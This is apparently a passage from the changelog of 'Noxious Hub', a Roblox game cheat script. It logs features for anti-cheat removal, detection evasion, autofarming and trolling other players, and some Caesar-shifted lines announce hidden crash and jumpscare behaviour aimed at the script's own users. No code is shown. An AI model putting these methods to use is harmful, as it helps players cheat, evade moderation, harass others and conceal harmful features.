	"- Attempted to fix enablegeneratoraura not working at all.",
	"- Removed some half-patched (HP) commands.",
	"- Revamped the chat guiding commands.",
	"- Attempted to fix commands regarding tweening or teleporting.",
	"- Made it so the antilag command processes objects in batches.",
	" ",
	"Other:",
	"- Reworked script structure.",
	"- Optimized the script.",
	" ",
	"--------------------- Older Updates (Listed down below, with date): ---------------------",
	" ",
	"[Update 7.7.1, released on Monday, April 29th 2025]:",
	" ",
	"Command updates:",
	"- Added 1 'Local Player' command. (unionautofarm)",
	"- Attempted to fix enableautoteleporttogenerator command not working at all.",
	"- Attempted to fix clip command not letting you go inside the elevator.",
	"- Updated the enablegodmode command.",
	"- Removed the disablegodmode command.",
	" ",
	"Other:",
	"- Adjusted tracer functionality.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.7.0, released on Friday, April 26th 2025]:",
	" ",
	"UI changes:",
	"- Attempted to fix configuration changing requiring two inputs for mobile users.",
	" ",
	"Command updates:",
	"- Added 4 'Local Player' commands. (enable / disable generatoraura)",
	"- Added 10 'ESPs / Visuals' commands. (enable / disable allvisualizers, show / hide",
	"   killvisualizer, show / hide nearvisualizer, show / hide visionvisualizer, show / hide",
	"   hearingvisualizer)",
	"- Fixed commands regarding the name not working for the configuration section.",
	"- Updated the enablealternativefullbright command.",
	"- Attempted to fix enableautoteleporttoelevator command teleporting you only once.",
	"- Attempted to fix enableautoteleporttogenerator command not working at all.",
	"- Attempted to fix clip command not letting you go inside the elevator.",
	" ",
	"Other:",
	"- Adjusted tracer functionality.",
	"- Updated the Autofarm GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.9, released on Thursday, April 24th 2025]:",
	" ",
	"Command updates:",
	"- Attempted to fix disableautoteleporttoelevator command making you not being able",
	"   to re-enable auto teleport to elevator.",
	"- Made it so enableautoteleporttoelevator teleports you to the elevator once.",
	"- Attempted to fix loop animation commands not working in runs.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.8, released on Monday, April 19th 2025]:",
	" ",
	"UI changes:",
	"- Seperated the Main and Settings button.",
	" ",
	"Other:",
	"- Updated the Autofarm GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.7, released on Friday, April 18th 2025]:",
	" ",
	"UI changes:",
	"- Attempted to fix configuration changing requiring two inputs for mobile users.",
	"- Updated the 'Information' tab.",
	" ",
	"Command updates:",
	"- Added 1 'Main' command. (feedback)",
	"- Added 3 'Fun / Trolls' commands. (fliptools, headsit2 [target], unheadsit2)",
	"- Added 1 'Local Player' command. (pickupallbaskets)",
	"- Added 12 'Animations / Emotes' commands. (enable / disable",
	"   loopextractinganimation, enable / disable loopidleanimation, enable / disable",
	"   loopquirkanimation, enable / disable looprunninganimation, enable / disable",
	"   loopwalkinganimation, enable / disable loopabilityanimation)",
	" ",
	"Setting updates:",
	"- Added 1 Script setting. (Simple ESP Text)",
	" ",
	"Other:",
	"- Added item tweening for the event toons, twisteds, and capsules.",
	"- Fixed script not working in runs.",
	"- Attempted to fix premium user registering.",
	"- Updated Pebble's animations to the Animation GUI.",
	"- Added Yatta, Bassie, Cocoa, Eggson, and Flyte's walking, running, idle, and",
	"   extracting animations to the Animation GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.7, released on Saturday, April 5th 2025]:",
	" ",
	"UI changes:",
	"- Attempted to fix configuration changing requiring two inputs for mobile users.",
	"- Fixed not being able to scroll in the script configuration section.",
	"- Attempted to fix command pasting not working for favorited commands.",
	" ",
	"Command updates:",
	"- Added 1 'Scripts' command. (poltergeistscript)",
	"- Added 2 'Teleports' commands. (enable / disable autoteleporttogenerator2)",
	"- Attempted to fix enableautoskillcheck2 causing performance issues.",
	"- Attempted to fix enableautoteleporttogenerator making you teleport every frame.",
	" ",
	"Other:",
	"- Made it sot the script configurations save to file.",
	"- Fixed tester notification popping up for non-testers.",
	"- Made the intro slightly quicker.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.6, released on Wednesday, April 2nd 2025]:",
	" ",
	"Other:",
	"- Made it so the commands are case-insensitive.",
	"- Updated the Autofarm GUI.",
	"- Fixed date errors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.5, released on Sunday, March 30th 2025]:",
	" ",
	"Command updates:",
	"- Updated the enable / disable godmode command.",
	" ",
	"Other:",
	"- Added queue on teleport functionality to the script.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.4, released on Saturday, March 22nd 2025]:",
	" ",
	"UI changes:",
	"- Added new 'Configuration' section for the top bar.",
	" ",
	"Command updates:",
	"- Added 1 'Premium Commands' command. (scriptcrash)",
	"- Added 3 'Local Player' commands. (enable / disable autocalibration2, enable / disable",
	"   godmode)",
	" ",
	"Other:",
	"- Attempted to fix tracers causing performance issues.",
	"- Made it so executing a Premium Command as a Noxious Premium User does not",
	"   affect you.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.3, released on Saturday, March 9th 2025]:",
	" ",
	"UI changes:",
	"- Added new command list button. (Risky Commands)",
	"- Removed 'Client Sided Skins' command list button.",
	"- Renamed 'Pinned Commands' command list button to 'Favorited Commands'.",
	"- Added a clickable bookmark icon next to commands.",
	" ",
	"Command updates:",
	"- Moved every single 'Client Sided Skins' commands to 'ESPs / Visuals'",
	" ",
	"Other:",
	"- Attempted to fix script not working at all for certain PC executors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.2, released on Thursday, March 7th 2025]:",
	" ",
	"UI changes:",
	"- Fixed command clicking functionality not working for mobile.",
	"- Renamed 'Pinned Commands' command list button to 'Favorited Commands'.",
	"- Added a clickable bookmark icon next to commands.",
	" ",
	"Command updates:",
	"- Removed 4 'Main' commands. (enable / disable pincommandsmode, enable / disable",
	"   removepinnedcommandsmode)",
	"- Renamed 'executeallpinnedcommands' command to 'executeallfavoritedcommands'.",
	"- Attempted to fix enablenotifier command executing lowhealthchatguider.",
	"- Added antipopups command to the Solo Run and Public Run Loadouts.",
	"- Fixed disableallesp command not disabling ESP for the fake elevator.",
	" ",
	"Other:",
	"- Fixed favorited commands not saving into the file.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.1, released on Thursday, March 2nd 2025]:",
	" ",
	"UI changes:",
	"- Attempted to fix toggle interface visibility button not loading properly.",
	"- Attempted to fix the text for workspace.info and credits tab not displaying properly.",
	"- Renamed 'Developer Commands' command list button to 'Premium Commands'.",
	" ",
	"Command updates:",
	"- Added 1 'Main' command. (getnoxiouspremium)",
	"- Revamped Premium Commands.",
	"- Attempted to fix commands that notify you crashing the game after executing.",
	"- Attempted to fix commands that involve tweening crashing the game after executing.",
	" ",
	"Other:",
	"- Attempted to fix Noxious Premium checks.",
	"- Fixed script crashing or freezing your client upon execution.",
	"- Added Noxious Premium.",
	"- Attempted to fix 'Reload Noxious' button not reloading the script.",
	"- Attempted to fix script causing performance issues upon execution.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.6.0, released on Thursday, February 27nd 2025]:",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (usehealerloadout and usedistractorloadout)",
	"- Added 2 'Main' commands. (executeallpinnedcommands and gobbydiscord)",
	"- Updated script that executes when running the gobbydwscript command.",
	"- Attempted to fix korblox and unkorblox commands not working properly.",
	"- Fixed Toon checks for the valentinesgigiskin, valentinesshellyskin, and",
	"   twistedpoppyskin commands.",
	"- Removed certain patched commands due to them being patched for good.",
	" ",
	"Other:",
	"- Made it so the script avoids getting executed twice.",
	"- Attempted to fix script refusing to work on some occasions.",
	"- Attempted to fix script causing performance issues upon execution.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.9, released on Saturday, February 22nd 2025]:",
	" ",
	"UI changes:",
	"- Added new command list button. (Pinned Commands)",
	"- Fixed invalid command error duplicating when clicking on the execute button.",
	"- Fixed Developer Commands and Admin commands popping up in the command list buttons list",
	"   for players who arent script developers or admins on some devices.",
	"- Fixed reload noxious, workspace.info, Noxious info and developer note buttons",
	"   underlapping with some UI elements for some devices.",
	"- Fixed tab buttons requiring 2 fingers to tap on for certain devices.",
	"- Optimized tooltip UI and functionality for mobile users.",
	"- Fixed intro screen text not disappearing when the environment hasnt properly loaded",
	"   yet.",
	"- Attempted to fix interface UI appearing offscreen if loaded improperly.",
	"- Attempted to command bar not being able to process valid commands after pressing",
	"   enter.",
	"- Attempted to fix not being able to drag the interface UI on some devices.",
	"- Adjusted labels for the username and display name for the top frame of the interface.",
	"- Fixed UI elements not disappearing after clicking on a tab.",
	" ",
	"Command updates:",
	"- Added 18 'ESPs / Visuals' commands. (fakeblackouts [number],",
	"   fakedandyitemspurchased [number], fakefloorstraveled [number],",
	"   fakemachinesfinished [number] fakefurthestfloor [number], fakeitemspickedup",
	"   [number], enable / disable alltracers, enable / disable playertracers, enable / disable",
	"   machinetracers, enable / disable twistedtracers, enable / disable itemtracers, enable",
	"   / disable fakeelevatortracers)",
	"- Added 8 'Client Sided Skins' commands. (twistedpoppyskin, armless, unarmless,",
	"   legless, unlegless, korblox, unkorblox, unabliusunablecifer)",
	"- Added 2 'Local Player' command. (floatgui, useesploadout)",
	"- Added 5 'Scripts' commands. (bobbydwscript, rodestrikerdwscript, otvajnidwscript,",
	"   soupdwscript, ffjdwscript)",
	"- Added 4 'Main' commands. (enable / disable pincommandsmode, enable / disable",
	"   removepincommandsmode)",
	"- Changed 'sit' command to 'cradle'.",
	"- Changed 'unsit' command to 'uncradle'.",
	"- Fixed bodiless and healdess commands not working at all for some toons.",
	"- Attempted to fix view command making your camera lock onto a twisted.. somehow.",
	"- Attempted to fix becomedandy command not working on some circumstances.",
	"- Changed camera subject target for the view command.",
	"- Updated Discord link for the noxiousdiscord command.",
	"- Attempted to fix deleteinvisibleborders command not working at all.",
	"- Removed certain patched commands due to them being patched for good.",
	"- Attempted to fix patched commands.",
	"- Attempted to fix certain half patched commands.",
	"- Brung back certain patched commands and labeled them as half-patched due to them",
	"   being partly revived.",
	"- Fixed all enablefloatdistract commands banning you if used incorrectly.",
	"- Adjusted heights for all enablefloatdistract commands.",
	"- Updated script that executes when running the explorer command.",
	"- Attempted to fix enabledeadplayerchatguider command not displaying the player's",
	"   toon properly.",
	"- Attempted to fix cffly command banning you if used incorrectly.",
	"- Fixed some commands not being listed in their command lists.",
	"- Repositioned some commands to their designated lists.",
	"- Made it so executing a loadout command applies the effects instantly.",
	"- Renamed 'eesp' (enablesp) to 'eaesp' (enableallesp).",
	" ",
	"Other:",
	"- Attempted to fix script not executing at all when using JJSploit.",
	"- Attempted to fix script not executing at all when using Xeno.",
	"- Fixed Animations GUI not executing at all for some countries.",
	"- Fixed script crashing upon execution when using Arceus X Neo.",
	"- Fixed script crashing upon execution when using Cryptic.",
	"- Cleared blacklisted users list.",
	"- Refined script code in order to make it consume less memory when executed.",
	"- Gave mobile players a warning upon executing the script.",
	"- Fixed reloading Noxious Hub getting you banned on some circumstances.",
	"- Fixed spelling errors in some command lists.",
	"- Removed 'him'.",
	"- Implemented an anti-crack system to the script.",
	"- Implemented an anti chat logger to the script.",
	"- Attempted to fix client freezing for a few seconds upon script execution for some",
	"   devices.",
	"- Corrected spelling errors. (how do we keep doing this smh)",
	"- Added more secrets.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.8, released on Wednesday, February 12th 2025]:",
	" ",
	"Command updates:",
	"- Added 17 'Local Player' commands. (gettoon, unlockall, enable / disable",
	"   lowhealthnotifier, enable / disable deadplayernotifier, enable / disable",
	"   twistedsnotifier, enable / disable rareitemsnotifier, enable / disable notifier, enable /",
	"   disable antikick, enablefloatdistract2, enablefloatdistract3)",
	"- Added 2 'Map / Environment' commands. (enable / disable alternativefullbright)",
	"- Added 4 'Client Sided Skins' commands. (valentinesshellyskin, valentinesgigiskin,",
	"   headless, unheadless, bodiless, unbodiless)",
	"- Replaced enablefloatdistract command with enablefloatdistract1.",
	"- Removed gettoon and unlockall commands due to them not working at all.",
	"- Removed enable / disable healsnotifier and enable / disable extractionitemsnotifier",
	"   commands.",
	"- Added 2 'ESPs / Visuals' commands. (show / hide discardedgui)",
	" ",
	"Other:",
	"- Made it so clicking on a command pre-types it into the command bar.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.7, released on Friday, February 7th 2025]:",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (speedchangergui, oldautofarmgui)",
	"- Fixed deleteinvisibleborders command causing major performance issues when the elevator",
	"   opens in a run.",
	" ",
	"Other:",
	"- Fixed Autofarm GUI spawning platforms IN the map instead of UNDER the map.",
	"- Attempted to fix Autofarm GUI staying still / floating mid air when a twisted is chasing",
	"   you.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.6, released on Wednesday, February 5th 2025]:",
	" ",
	"Command updates:",
	"- Added 1 'Local Player' command. (speedchangergui)",
	"- Made it so enablefloatdistract changes your hip height to 5.6 instead of 5.",
	"- Removed pickupallornaments command.",
	"- Attempted to fix certain half patched commands.",
	"- Attempted to fix certain patched commands.",
	" ",
	"Other:",
	"- Lowered the huge platform by 1 stud.",
	"- Attempted to fix performance issues occurring after the elevator opens in a run.",
	"- Completely reworked the Autofarm GUI. (Still in beta)",
	"- Disabled ESP color tweening for everything regarding the christmas event.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.5, released on Saturday, February 1st 2025]:",
	" ",
	"UI changes:",
	"- Made notification UI significantly smaller.",
	" ",
	"Command updates:",
	"- Added 2 'ESPs / Visuals' commands. (enable / disable fakeelevatoresp)",
	"- Removed enable / disable autopickupallitems commands due to them causing major",
	"   performance issues when the elevator opens in a run.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.5, released on Saturday, January 24th 2025]:",
	" ",
	"Command updates:",
	"- Addde d 1 ;ESeSPs //Vi lsiuisl' coamdnd n? ? (polaris)",
	"- Added 2 'Main' commands. (settogglekeybind and cleartogglekeybind)",
	"- Added 2 'Local Player' commands. (enable / disable floatdistract) (Credits to Truck1st",
	"   on Discord for figuring this out)",
	"- Changed 'Zyra' to 'Hex' for zyradwscript and zyradiscord.",
	" ",
	"Other:",
	"- Adjusted platform position.",
	"- Removed pathfinding functionality for tweening.",
	"- Upgraded Autofarm GUI script. (Still in beta)",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.4, released on Friday, January 23rd 2025]:",
	" ",
	"Command updates:",
	"- Fixed commands not working at all.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.3, released on Tuesday, January 22nd 2025]:",
	" ",
	"Command updates:",
	"- Added patched (P) label to certain commands.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.2, released on Monday, January 21st 2025]:",
	" ",
	"UI changes:",
	"- Attempted to command bar not being able to process valid commands after pressing",
	"   enter on some devices.",
	"- Fixed command bar not being able to process commands while another command is",
	"   already running on some devices.",
	"- Refined UI interface to avoid causing performance issues.",
	"- Refined intro UI to avoid causing performance issues.",
	"- Adjusted labels for the username and display name for the top frame of the interface.",
	"- Upgraded tooltip UI functionality.",
	"- Fixed UI elements not disappearing after clicking on a tab.",
	"- Fixed tab buttons requiring 2 fingers to tap on for certain devices.",
	" ",
	"Command updates:",
	"- Fixed view command not working at all.",
	"- Brung back certain patched commands and labeled them as half-patched due to them",
	"   being partly revived.",
	"- Attempted to fix certain commands that require tweening causing major",
	"   performance issues on some devices.",
	"- Adjusted functionalities for certain commands for them to work on floor 1.",
	"- Switched teleporting method to tweening for certain commands.",
	"- Removed certain patched commands due to then being patched for good.",
	"- Attempted to fix certain half patched commands.",
	"- Attempted to fix enabletwistedschatguider command not fully showing all twisteds.",
	"- Attempted to fix enabledeadplayerchatguider command not showing the player's",
	"   selected toon name.",
	"- Attempted to fix antilag command freezing the game for a few seconds.",
	"- Adjusted enableglitchednametag command.",
	" ",
	"Other:",
	"- Improved script undetectability.",
	"- Corrected spelling mistakes.",
	"- Fixed player experiencing jumpscares every 1-2 hours or so. (who tf)",
	"- Fixed Animation GUI not playng animations on some occasions.",
	"- Changed 'Team Noxious & Plethora' text in the Credits tab to 'Team Noxious &",
	"   Others'.",
	"- Added missing information in the Info tab.",
	"- Upgraded Autofarm GUI script. (Still in beta)",
	"- Refined script's code to ensure undetectability.",
	"- Refined print statements for the Autofarm GUI.",
	"- Lqfuhdvhg fkdqfhv ri 'klp' vsdzqlqj rq vror uxqv.",
	"- Pdgh lw vr 'kh' kdv wkh delolwb wr mxpsvfduh brx.",
	"- Pdgh lw vr 'kh' fdq fudvk brxu folhqw.",
	"- Pdgh lw vr 'kh' fdq iuhhch brxu folhqw.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.1, released on Saturday, January 19th 2025]:",
	" ",
	"Command updates:",
	"- Switched teleporting method to tweening for certain commands.",
	"- Attempted to fix certain half patched commands.",
	" ",
	"Other:",
	"- Upgraded Autofarm GUI script. (Now works on floor 1) (Still in beta)",
	"- Added a huge platform that spawns under the map to help certain commands.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.5.0, released on Friday, January 17th 2025]:",
	" ",
	"Command updates:",
	"- Added 6 'Client Sided Skins' commands. (sproutcutout, dandycutout, shellycutout,",
	"   pebblecutout, astrocutout, veecutout)",
	"- Added 1 'Local Player' command. (fov [number])",
	"- Made it so executing removeanticheat will not remove the 'WarnUser' remote, so you",
	"   would know that the game is warning you.",
	"- Fixed certain commands not executing properly.",
	" ",
	"Other:",
	"- Added Twisted Bobette, Coal, Ginger and Rudie's idle, running and walking",
	"   animations to the Animation GUI.",
	"- Attempted to fix performance issues occurring after the elevator opens in a run.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.9, released on Thursday, January 16th 2025]:",
	" ",
	"UI changes:",
	"- Adjusted labels for the username and display name for the top frame of the interface.",
	" ",
	"Command updates:",
	"- Fixed certain commands not executing properly.",
	"- Fixed oldnoxious command executing otvajni's fly script.",
	"- Converted certain patched commands to half patched.",
	"- Removed certain patched commands due to them being patched for good.",
	" ",
	"Other:",
	"- Refined script's code structure.",
	"- Removed toggling interface visibility functionality using N on your keyboard.",
	"- Attempted to fix performance issues occurring after the elevator opens in a run.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.8, released on Monday, January 13th 2025]:",
	" ",
	"UI changes:",
	"- Added 'Developer Note' button in the bottom frame in the Credits tab.",
	" ",
	"Command updates:",
	"- Added patched (P) label to certain commands.",
	"- Added Bobette, Coal, Ginger and Rudie for the unlockalltoons command.",
	"- Added Bobette, Coal, Ginger and Rudie's trinkets for the unlockalltrinkets command.",
	" ",
	"Other:",
	"- Reverted certain command mechanics to how they were in version 5.9.0 as an",
	"   attempt to get rid of performance issues.",
	"- Attempted to fix performance issues occurring after the elevator opens in a run. (help",
	"   me)",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.7, released on Saturday, January 11th 2025]:",
	" ",
	"Command updates:",
	"- Added 1 'Local Player' command. (pickupallornaments)",
	"- Formatted 'RazzleDazzle' to 'Razzle & Dazzle' for research capsule item ESP,",
	"   monster ESP, and enabletwistedschatguider command.",
	"- Made it so Event Twisteds's ESP colors repetitively fade from red to jade.",
	"- Made it so resaerch capsules that are related to an event toon's ESP colors",
	"   repetitively fade from red to jade.",
	"- Removed certain patched commands due to them being patched for good.",
	"- Attempted to fix enabletwistedschatguider command not fully showing all twisteds.",
	"- Attempted to fix antilag command freezing the game for a few seconds.",
	"- Attempted to fix certain half patched commands.",
	" ",
	"Other:",
	"- Attempted to fix performance issues occurring after the elevator opens in a run.",
	"- Attempted to fix autofarm GUI.",
	"- Added Bobette, Coal, Ginger, and Rudie's idle, walking, running, and extracting",
	"   animations to the Animation GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.6, released on Friday, January 10th 2025]:",
	" ",
	"UI changes:",
	"- Upgraded intro UI.",
	"- Upgraded tooltip UI functionality.",
	" ",
	"Command updates:",
	"- Attempted to fix certain half patched commands.",
	"- Made it so ornaments' ESP colors repetitively fade from red to jade.",
	" ",
	"Other:",
	"- Added a (P) label to some commands to indicate that it could be patched.",
	"- Added a (HP) label to some commands to indicate that it could be partly patched.",
	" ",	
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.5, released on Tuesday, January 7th 2025]:",
	" ",
	"Command updates:",
	"- Made it so becomecharacter command makes chat bubbles visible. (Special thanks to",
	"   @sd_pbbb and @j8mpm0nk on Discord for figuring this out!)",
	" ",
	"Other:",
	"- Reverted Autofarm GUI script mechanics to the old one.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.4, released on Monday, January 6th 2025]:",
	" ",
	"Command updates:",
	"- Removed rodestrikerdwscript command.",
	"- Added 1 'ESPs / Visuals' command. (changeresearch)",
	"- Added 2 'Local Player' commands. (spectate and unspectate)",
	"- Attempted to fix deleteinvisibleborders command causing performance issues after",
	"   executing.",
	" ",
	"Other:",
	"- Upgraded Autofarm GUI script.",
	"- Attempted to fix script causing performance issues after the 'Panic' BoolValue gets",
	"   set to true.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.3, released on Sunday, January 5th 2025]:",
	" ",
	"Command updates:",
	"- Added 2 'Fun / Trolls' commands. (enable / disable walkfling)",
	"- Attempted to fix antifling command causing performance issues after executing.",
	"- Removed rpfling [target] command due to it not working at all.",
	"- Shortened 'roleplay' to 'rp' for certain commands.",
	" ",
	"Other:",
	"- Corrected spelling errors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.2, released on Saturday, January 4th 2025]:",
	" ",
	"UI changes:",
	"- Added an execute button on the right side of the command bar.",
	"- Fixed command bar not being able to process valid commands after pressing enter.",
	"- Fixed command bar not being able to process commands while another command is",
	"   already running.",
	"- Made it so pressing the execute button after typing in a command doesn't make the",
	"   text disappear.",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (antifling and unantifling)",
	"- Attempted to fix fling [target] command not working at all.",
	"- Made it so changeusername [text] and changedisplay [text] commands affect the top",
	"   frame of the interface.",
	" ",
	"Other:",
	"- Added an anti GUI detector in the script to ensure script undetectabilty.",
	"- Added an anti instance detector in the script to ensure script undetectability.",
	"- Fixed certain commands on the lists not having arguments.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.1, released on Friday, January 3rd 2025]:",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (enable / disable autopickupallitems)",
	"- Added 2 'Fun / Trolls' commands. (enable / disable looproleplayinvisibility [target]).",
	"- Added an argument to roleplayinvisiblility. (roleplayinvisibility [target])",
	"- Replaced enable / disable extractionitemschatguider and enable / disable",
	"   healschatguider commands with enable / disable rareitemschatguider.",
	"- Attempted to fix forceuseitems2 [target], enable / disable loopforceuseitems",
	"   [target 1] [target 2] [delay] and enable / disable loopforceuseability2 [target 1]",
	"   [target 2] [delay] commands not working at all.",
	" ",
	"Other:",
	"- Revamped notification functionality.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.4.0, released on Thursday, January 2nd 2025]:",
	" ",
	"Command updates:",
	"- Added 1 'Scripts' command. (yiwdwscript)",
	"- Added 10 'Fun / Trolls' commands. (forceuseitems [target], enable / disable",
	"   loopforceuseitems [target] [delay], enable / disable loopforceuseability [target]",
	"   [delay], enable / disable loopforceuseability2 [target 1] [target 2] [delay],",
	"   forceuseitems2 [target 1] [target 2], enable / disable loopforceuseitems2",
	"   [target 1] [target 2] [delay]",
	"- Attenpted to fix enableloopforceuseability2 not working at all.",
	"- Added exclamation point labels on certain commands.",
	"- Attempted to fix enabletwistedschatguider command not fully showing all twisteds.",
	" ",
	"Other:",
	"- Added more info for the 'Info' tab.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.9, released on Wednesday, January 1st 2025]:",
	" ",
	"Command updates:",
	"- Added 14 'Fun / Trolls' commands. (enable / disable hurtface [target], enable / disable",
	"   spamtogglefaces [target] [delay], runabilityanimation [target], enable / disable",
	"   looprunabilityanimation [target] [delay], runtwistedattack [target], enable / disable",
	"   loopruntwistedattack [target] [delay], enable / disable loophurtface [target [delay],",
	"   and enable / disable loopnormalface [target] [delay])",
	"- Added 2 'Local Player' commands. (enable / disable glitchedrpname)",
	"- Added an extra argument to runrpability. (runrpability [target] [toon name])",
	"- Made it so enable / disablejump command works for PC users.",
	"- Attempted to fix enabletwistedschatguider command not fully showing all twisteds.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.8, released on Tuesday, December 31st 2024]:",
	" ",
	"Command updates:",
	"- Added 13 'Local Player' commands. (enable / disable lowhealthchatguider,",
	"   enable / disable deadplayerchatguider, enable / disable twistedschatguider,",
	"   enable / disable healschatguider, enable / disable extractionitemschatguider,",
	"   enable / disable chatguider, runactiveability [target].)",
	"- Added 1 'Fun / Trolls' command. (roleplayinvisibility)",
	"- Attempted to fix enabletwistedschatguider command spamming the list of twisteds.",
	"- Changed 'rodestrikersaniationcloset' command name to 'glistensanimationcloset'.",
	" ",
	"Other:",
	"- Attempted to fix command buttons requiring 2 fingers to press on mobile.",
	"- Added 'Enable / Disable Auto Get Research' buttons for the Autofarm GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.7, released on Monday, December 30th 2024]:",
	" ",
	"UI changes:",
	"- Added 'Workspace.Info' and 'Noxious Info' buttons in the bottom frame in the Info tab.",
	"- Added 'Reload Noxious' button in the bottom frame in the Changelogs and Credits tab.",
	" ",
	"Command updates:",
	"- Added 2 'Scripts' commands. (moxdwscript and spooksdwscript)",
	"- Brung back 1 'Local Player' command. (cosmoselfheal)",
	"- Added 2 'Main' commands. (closeallnotifications and reloadnoxious)",
	"- Updated the script that executes when executing gobbydwscript.",
	"- Fixed enableglitchednametag and enablerunofs30znametag not working at all.",
	" ",
	"Other:",
	"- Extended warning notifications' time limit from 5 seconds to 10 seconds before going",
	"   away.",
	"- Made it so pressing X closes all notifications.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.6, released on Sunday, December 29th 2024]:",
	" ",
	"UI changes:",
	"- Upgraded intro text.",
	"- Adjusted intro UI elements.",
	"- Made it so clicking on any tab besides the 'Commands' tab will hide the command bar.",
	" ",
	"Command updates:",
	"- Made it so teleporttogenerator blocks you from teleporting to a possessed",
	"   generator.",
	"- Made it so gatherresearch makes you encounter Razzle & Dazzle.",
	"- Fixed deleteinvisibleborders command clipping you through the floor in the new maps.",
	" ",
	"Other:",
	"- Refined script's code structure.",
	"- Attempted to make script more undetectable.",
	"- Revamped notification functionality.",
	"- Removed non-existent commands from the command list.",
	"- Fixed intro taking way too long to load.",
	"- Corrected spelling errors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.5, released on Saturday, December 28th 2024]:",
	" ",
	"UI changes:",
	"- Upgraded intro text.",
	"- Adjusted intro UI elements.",
	" ",
	"Command updates:",
	"- Added 2 'Teleports' commands. (enable / disable autoteleportto7playerelevator)",
	"- Changed 'eauc' to 'eaua' for the shortened version of enable / disable autouseability command.",
	"- Fixed deleteinvisibleborders command not deleting borders / invisible walls in",
	"   the new maps.",
	" ",
	"Other:",
	"- Removed non-existent commands from the command list.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.4, released on Friday, December 27th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
	"- Adjusted notification UI elements.",
	" ",
	"Command updates:",
	"- Added 2 'Local Player' commands. (pickupallheals and pickupallextractionitems)",
	"- Made it so Main Twisteds's ESP colors repetitively fade from red to black.",
	"- Made it so gatherresearch picks up Rodger's Fake Capsule.",
	" ",
	"Other:",
	"- Upgraded Autofarm GUI script. (Now 96% reliable!)",
	"- Added 'Pick Up All Heals' and 'Pick Up All Extraction Items' buttons for the Quality of",
	"   Life GUI.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.3, released on Thursday, December 26th 2024]:",
	" ",
	"UI changes:",
	"- Adjusted tooltip UI elements.",
	" ",
	"Command updates:",
	"- Removed close / open elevators commands due to both of them not working at all.",
	"- Adjusted teleport positions for pickupallitems, pickupallresearchcapsules, pickupalltapes,",
	"   teleporttoelevator, and teleporttogenerator commands.",
	" ",
	"Other:",
	"- Upgraded Autofarm GUI script. (Now 90% reliable!)",
	"- Refined script's code structure.",
	"- Attempted to make script consume less memory after executing.",
	"- Corrected spelling errors.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.2, released on Wednesday, December 25th 2024]:",
	" ",
	"Command updates:",
	"- Removed noclipcam and insertmodel commands due to both of them barely working.",
	"- Adjusted teleport positions for teleporttoelevator and teleporttogenerator commands.",
	" ",
	"Other:",
	"- Fixed script flashbanging you after executing.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.1, released on Tuesday, December 24th 2024]:",
	" ",
	"Command updates:",
	"- Added 1 'Local Player' command. (die)",
	" ",
	"Other:",
	"- Fixed client crashing or freezing after executing script on certain devices.",
	" ",
	"--------------------------------------------------------------------------------------------",
	" ",
	"[Update 7.3.0, released on Sunday, December 21st 2024]:",
	" ",
	"UI changes:",
	"- Adjusted interface UI elements.",
